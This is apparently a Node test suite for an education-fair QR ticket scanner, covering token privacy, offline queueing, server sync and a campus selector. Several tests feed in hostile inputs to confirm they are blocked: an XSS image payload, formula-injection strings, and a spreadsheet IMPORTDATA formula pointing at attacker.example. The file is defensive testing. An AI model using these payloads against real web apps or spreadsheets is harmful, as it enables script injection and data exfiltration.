const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const test = require('node:test');
const vm = require('node:vm');

const STORAGE_KEY = 'edufair_scan_queue';
const VALID_TOKEN = 'a'.repeat(64);
const TEST_API_URL = 'https://script.google.com/macros/s/test-deployment/exec';
const DEPLOYED_API_URL = 'https://script.google.com/macros/s/AKfycby6LOkfukNUs45lPizNuFrGCzAzQEo0WNCRHgajRSGvhCTF0j1JrTDpsyygHW89Bwzw/exec';

function createElement(tagName, innerHTMLWrites) {
  const element = {
    tagName: tagName.toUpperCase(),
    children: [],
    className: '',
    id: '',
    textContent: '',
    disabled: false,
    hidden: false,
    attributes: {},
    classList: {
      add(...classNames) {
        const classes = new Set(element.className.split(/\s+/).filter(Boolean));
        classNames.forEach(className => classes.add(className));
        element.className = [...classes].join(' ');
      },
      remove(...classNames) {
        element.className = element.className
          .split(/\s+/)
          .filter(value => value && !classNames.includes(value))
          .join(' ');
      },
      contains(className) {
        return element.className.split(/\s+/).filter(Boolean).includes(className);
      }
    },
    setAttribute(name, value) {
      this.attributes[name] = String(value);
    },
    getAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this.attributes, name) ? this.attributes[name] : null;
    },
    removeAttribute(name) {
      delete this.attributes[name];
    },
    addEventListener(eventName, handler) {
      element.listeners = element.listeners || {};
      element.listeners[eventName] = element.listeners[eventName] || [];
      element.listeners[eventName].push(handler);
    },
    appendChild(child) {
      this.children.push(child);
      return child;
    },
    prepend(child) {
      this.children.unshift(child);
    },
    remove() {},
    querySelector(selector) {
      if (!selector.startsWith('.')) return null;
      const className = selector.slice(1);
      const pending = [...this.children];
      while (pending.length > 0) {
        const child = pending.shift();
        if (child.className.split(/\s+/).includes(className)) return child;
        pending.push(...child.children);
      }
      return null;
    }
  };

  let innerHTML = '';
  Object.defineProperty(element, 'innerHTML', {
    get() {
      return innerHTML;
    },
    set(value) {
      innerHTML = value;
      innerHTMLWrites.push({ element, value });
    }
  });

  return element;
}

function createHarness({
  search = '?uni=constructor',
  hash = `#token=${VALID_TOKEN}`,
  initialQueue,
  storage = new Map(),
  online = false,
  apiUrl = TEST_API_URL,
  fetchResponses = []
} = {}) {
  const innerHTMLWrites = [];
  const elements = new Map();
  const fetchCalls = [];
  const consoleMessages = [];
  const responseQueue = [...fetchResponses];
  let scannerStarts = 0;

  if (initialQueue !== undefined) {
    storage.set(STORAGE_KEY, JSON.stringify(initialQueue));
  }

  const document = {
    body: createElement('body', innerHTMLWrites),
    createElement: tagName => createElement(tagName, innerHTMLWrites),
    getElementById(id) {
      if (!elements.has(id)) {
        elements.set(id, createElement('div', innerHTMLWrites));
      }
      return elements.get(id);
    }
  };

  function Html5Qrcode() {}
  Html5Qrcode.prototype.start = function start() {
    scannerStarts += 1;
    return Promise.resolve();
  };

  async function fetch(url, options) {
    fetchCalls.push({ url, options });
    const queued = responseQueue.shift() ?? { result: 'success', duplicate: false };
    if (queued instanceof Error) throw queued;
    return {
      ok: queued.ok ?? true,
      async json() {
        if (queued.jsonError) throw new Error('invalid json');
        return queued.body ?? queued;
      }
    };
  }

  const context = {
    console: {
      error(...values) { consoleMessages.push(['error', ...values.map(String)]); },
      log(...values) { consoleMessages.push(['log', ...values.map(String)]); },
      warn(...values) { consoleMessages.push(['warn', ...values.map(String)]); }
    },
    Date,
    document,
    fetch,
    Html5Qrcode,
    localStorage: {
      getItem: key => storage.get(key) ?? null,
      setItem: (key, value) => storage.set(key, value)
    },
    navigator: { onLine: online },
    setInterval: () => 0,
    setTimeout: callback => {
      callback();
      return 0;
    },
    URL,
    URLSearchParams,
    window: {
      addEventListener() {},
      crypto: { randomUUID: () => '00000000-0000-4000-8000-000000000000' },
      location: { search, hash }
    }
  };

  const html = fs.readFileSync('index.html', 'utf8');
  const scriptStart = html.lastIndexOf('<script>');
  const sourceStart = html.indexOf('>', scriptStart) + 1;
  const sourceEnd = html.indexOf('</script>', sourceStart);
  let source = html.slice(sourceStart, sourceEnd);

  if (apiUrl !== undefined) {
    source = source.replace(
      /const API_URL\s*=\s*[^;]+;/,
      `const API_URL = ${JSON.stringify(apiUrl)};`
    );
  }

  vm.createContext(context);
  vm.runInContext(source, context, { filename: 'index.html' });

  return {
    context,
    consoleMessages,
    elements,
    fetchCalls,
    innerHTMLWrites,
    queue: () => JSON.parse(storage.get(STORAGE_KEY) ?? '[]'),
    scannerStarts: () => scannerStarts,
    storage,
    async flushPromises() {
      await new Promise(resolve => setImmediate(resolve));
      await new Promise(resolve => setImmediate(resolve));
    }
  };
}

test('uses the deployed fair-scan-file Apps Script URL', () => {
  const html = fs.readFileSync('index.html', 'utf8');
  assert.ok(html.includes(`const API_URL = '${DEPLOYED_API_URL}';`));
  assert.doesNotMatch(html, /const API_URL = UNCONFIGURED_API_URL;/);
  assert.throws(
    () => createHarness({ apiUrl: null }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('loads a verified same-origin cross-browser QR decoder', () => {
  const html = fs.readFileSync('index.html', 'utf8');
  const scannerPath = 'vendor/html5-qrcode.min.js';

  assert.match(html, /<script src="vendor\/html5-qrcode\.min\.js"><\/script>/);
  assert.doesNotMatch(html, /<script[^>]+src=["']https?:\/\//i);
  assert.equal(fs.existsSync(scannerPath), true, 'vendored QR decoder is missing');

  const digest = crypto
    .createHash('sha256')
    .update(fs.readFileSync(scannerPath))
    .digest('hex');
  assert.equal(
    digest,
    '660b12437b1d747e3e68b8be0685c08cb728140110ad213f167b14b66f8b1d8e'
  );
});

test('does not start without a participant token', () => {
  assert.throws(
    () => createHarness({ hash: '' }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('does not start with a malformed or formula-prefixed participant link', () => {
  assert.throws(
    () => createHarness({ hash: '#token=short' }),
    /Invalid participant link or scanner deployment configuration/
  );
  assert.throws(
    () => createHarness({ search: '?uni=%3DIMPORTDATA' }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('accepts an organizer-defined participant identifier', () => {
  const participantId = 'თსუ / Tbilisi 2026';
  const harness = createHarness({ search: `?uni=${encodeURIComponent(participantId)}` });
  assert.equal(harness.scannerStarts(), 1);
  assert.equal(harness.elements.get('uni-name').textContent, participantId);
});

test('renders legacy stored QR content as text and never renders the token', () => {
  const payload = '<img src=x onerror="globalThis.compromised=true">';
  const harness = createHarness({
    initialQueue: [{
      id: 'existing-scan',
      participantId: 'constructor',
      token: VALID_TOKEN,
      uuid: payload,
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(
    harness.innerHTMLWrites.some(write =>
      write.value.includes(payload) || write.value.includes(VALID_TOKEN)
    ),
    false,
    'attacker-controlled QR content or token reached innerHTML'
  );

  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-uuid').textContent, payload);
  assert.equal(harness.elements.get('uni-name').textContent, 'constructor');
});

test('does not queue an invalid scanned ticket identifier', () => {
  const harness = createHarness();
  harness.context.onScanSuccess('=1+1');
  assert.deepEqual(harness.queue(), []);
});

test('persists the participant credential with an offline scan', () => {
  const storage = new Map();
  const firstHarness = createHarness({ storage, online: false });
  firstHarness.context.onScanSuccess('A1B2C3D4');

  assert.equal(firstHarness.fetchCalls.length, 0);
  assert.equal(firstHarness.queue()[0].participantId, 'constructor');
  assert.equal(firstHarness.queue()[0].token, VALID_TOKEN);
  assert.equal(firstHarness.queue()[0].status, 'pending');

  const restoredHarness = createHarness({ storage, online: false });
  assert.equal(restoredHarness.queue()[0].token, VALID_TOKEN);
  assert.equal(restoredHarness.elements.get('scans-list').children.length, 1);
});

test('posts credentials in the body without putting the token in the URL', async () => {
  const harness = createHarness({ online: true });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1);
  const call = harness.fetchCalls[0];
  assert.equal(call.url, TEST_API_URL);
  assert.equal(call.options.method, 'POST');
  assert.equal(call.options.credentials, 'omit');
  assert.equal(call.options.referrerPolicy, 'no-referrer');
  assert.doesNotMatch(call.url, new RegExp(VALID_TOKEN));

  const body = new URLSearchParams(call.options.body);
  assert.equal(body.get('participant_id'), 'constructor');
  assert.equal(body.get('token'), VALID_TOKEN);
  assert.equal(body.get('uuid'), 'A1B2C3D4');
  assert.equal(harness.queue()[0].status, 'synced');
  assert.equal(
    harness.consoleMessages.flat().some(value => value.includes(VALID_TOKEN)),
    false,
    'token was logged'
  );
});

test('treats a server duplicate as synchronized', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [{ result: 'success', duplicate: true }]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'synced');
});

for (const code of ['unauthorized', 'invalid_request', 'invalid_ticket']) {
  test(`marks ${code} as rejected and does not retry it`, async () => {
    const harness = createHarness({
      online: true,
      fetchResponses: [{ result: 'error', code }]
    });
    harness.context.onScanSuccess('A1B2C3D4');
    await harness.flushPromises();
    assert.equal(harness.queue()[0].status, 'rejected');
    await harness.context.sync();
    assert.equal(harness.fetchCalls.length, 1);
  });
}

test('keeps server-busy scans pending for a later retry', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [
      { result: 'error', code: 'server_busy' },
      { result: 'success', duplicate: false }
    ]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');

  await harness.context.sync();
  assert.equal(harness.fetchCalls.length, 2);
  assert.equal(harness.queue()[0].status, 'synced');
});

test('keeps network failures pending without logging credentials', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [new Error(`network failure ${VALID_TOKEN}`)]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(
    harness.consoleMessages.flat().some(value => value.includes(VALID_TOKEN)),
    false,
    'network error leaked the token to logs'
  );
});

// --- Campus Intent Capture ---

const CONFIGURED_SEARCH = '?uni=ieu';
const CONFIGURED_OPTIONS = ['Madrid', 'Segovia', 'Undecided'];

test('unconfigured participant keeps the existing fast scanning flow with no campus selector', () => {
  const harness = createHarness({ online: true });
  assert.equal(harness.elements.has('campus-selector'), false);
  assert.equal(harness.elements.has('campus-options'), false);

  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, '');
});

test('configured participant sees a campus selector with every configured option plus Undecided', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
  const selector = harness.elements.get('campus-selector');
  assert.equal(selector.hidden, false);

  const optionButtons = harness.elements.get('campus-options').children;
  assert.deepEqual(optionButtons.map(button => button.textContent), CONFIGURED_OPTIONS);
  assert.equal(optionButtons[optionButtons.length - 1].textContent, 'Undecided');
});

test('configured institution cannot create a new queue item without a campus selection', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.onScanSuccess('A1B2C3D4');
  assert.deepEqual(harness.queue(), []);
});

test('selecting a campus allows a scan and attaches it to the queued item', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, 'Segovia');
});

test('campus resets after a successful capture and must be reselected for the next visitor', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);

  // No reselection before the next visitor's QR: it must be gated again.
  harness.context.onScanSuccess('E5F6G7H8');
  assert.equal(harness.queue().length, 1);
});

test('campus resets after a local duplicate is detected', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.onScanSuccess('A1B2C3D4'); // local duplicate, no second row
  assert.equal(harness.queue().length, 1);

  // Campus selection must not have survived the duplicate for the next visitor.
  harness.context.onScanSuccess('E5F6G7H8');
  assert.equal(harness.queue().length, 1);
});

test('an invalid-format QR does not consume the selected campus', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('=1+1'); // invalid format, ignored
  harness.context.onScanSuccess('A1B2C3D4'); // same visitor's correct QR
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, 'Madrid');
});

test('offline scans retain their own campus and several visitors can differ', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('E5F6G7H8');
  harness.context.selectCampus('Undecided');
  harness.context.onScanSuccess('11112222');

  const queue = harness.queue();
  assert.equal(queue.length, 3);
  assert.deepEqual(queue.map(scan => scan.campus), ['Madrid', 'Segovia', 'Undecided']);
});

test('later UI selections do not mutate an earlier queued scan', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.selectCampus('Segovia'); // selection changes after capture

  assert.equal(harness.queue()[0].campus, 'Madrid');
});

test('sync payload sends the campus belonging to each queued scan', async () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1);
  const body = new URLSearchParams(harness.fetchCalls[0].options.body);
  assert.equal(body.get('campus'), 'Segovia');
});

test('unconfigured participant syncs with an empty campus field', async () => {
  const harness = createHarness({ online: true });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  const body = new URLSearchParams(harness.fetchCalls[0].options.body);
  assert.equal(body.get('campus'), '');
});

test('legacy local queue objects without a campus field normalize safely', () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    initialQueue: [{
      id: 'legacy-scan',
      participantId: 'ieu',
      token: VALID_TOKEN,
      uuid: 'A1B2C3D4',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(harness.queue()[0].campus, '');
  assert.equal(harness.queue()[0].uuid, 'A1B2C3D4');
});

test('a stored campus value outside the participant allowlist is discarded on load', () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    initialQueue: [{
      id: 'tampered-scan',
      participantId: 'ieu',
      token: VALID_TOKEN,
      uuid: 'A1B2C3D4',
      campus: '=IMPORTDATA("https://attacker.example")',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(harness.queue()[0].campus, '');
});

test('synced and rejected campus-enabled scans still clear the bearer credential', async () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    online: true,
    fetchResponses: [{ result: 'error', code: 'invalid_ticket' }]
  });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.queue()[0].status, 'rejected');
  assert.equal(harness.queue()[0].token, '');
  assert.equal(harness.queue()[0].campus, 'Madrid');
});
